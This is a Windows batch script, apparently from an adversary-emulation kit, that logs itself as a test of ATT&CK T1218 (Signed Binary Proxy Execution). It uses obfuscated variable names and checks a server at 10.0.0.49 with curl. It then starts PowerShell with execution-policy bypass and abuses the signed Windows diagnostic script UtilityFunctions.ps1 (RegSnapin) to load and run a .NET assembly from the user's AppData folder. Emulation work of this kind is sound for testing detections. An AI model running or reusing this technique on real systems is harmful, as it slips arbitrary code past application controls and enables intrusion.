@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
REM Random constant names with PHR_ as values
SET pjkcpgw=%APPDATA%\7770\d2f83166
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?7770-10
SET hlbnp=ITZEL-S2B
SET pudaazx=10
SET syjfr=taskmgr.txt
SET ewjmdkff=7770

REM Derived paths
SET ztqkf=%APPDATA%\%pudaazx%
SET vztmql=%ztqkf%\macula-simulations.log

REM Create directory if missing
if not exist "%ztqkf%" mkdir "%ztqkf%" >nul 2>&1

echo [%DATE% %TIME%][DEBUG][%hlbnp%]: script_start=initializing>> "%vztmql%" 2>nul

REM 1. Server availability check
echo [%DATE% %TIME%][DEBUG][%hlbnp%]: heartbeat_check=starting>> "%vztmql%" 2>nul
curl -k -s -o nul "%drguvr%"
SET uwypt=%errorlevel%
echo [%DATE% %TIME%][DEBUG][%hlbnp%]: heartbeat_check=complete>> "%vztmql%" 2>nul

REM 2. Execute .NET DLL via T1218
echo [%DATE% %TIME%][DEBUG][%hlbnp%]: dll_execution=starting>> "%vztmql%" 2>nul
SET lksmwv=0
SET yzavp=

powershell.exe -ep bypass -command "set-location -path \"c:\windows\diagnostics\system\networking\"; import-module .\UtilityFunctions.ps1; RegSnapin '%pjkcpgw%\%syjfr%';[Program.Class]::Dale()"
IF NOT %errorlevel% EQU 0 (
    SET lksmwv=0
    SET yzavp=assembly_load_failed
) ELSE (
    SET lksmwv=1
)
echo [%DATE% %TIME%][DEBUG][%hlbnp%]: dll_execution=complete>> "%vztmql%" 2>nul

REM TTP logging for T1218
SET dyygr=%DATE%
SET ksdkd=%TIME%
SET pztgv=%dyygr:~-4%-%dyygr:~3,2%-%dyygr:~0,2%
SET qqmhy=%ksdkd:~0,2%:%ksdkd:~3,2%:%ksdkd:~6,2%.%ksdkd:~9,3%
(
    echo [%pztgv% %qqmhy%][%hlbnp%]: %pudaazx%-%ewjmdkff%-T1218|Signed Binary Proxy Execution=%lksmwv%:%yzavp%
) >> "%vztmql%" 2>nul || rem

echo [%DATE% %TIME%][DEBUG][%hlbnp%]: script_end=complete>> "%vztmql%" 2>nul
ENDLOCAL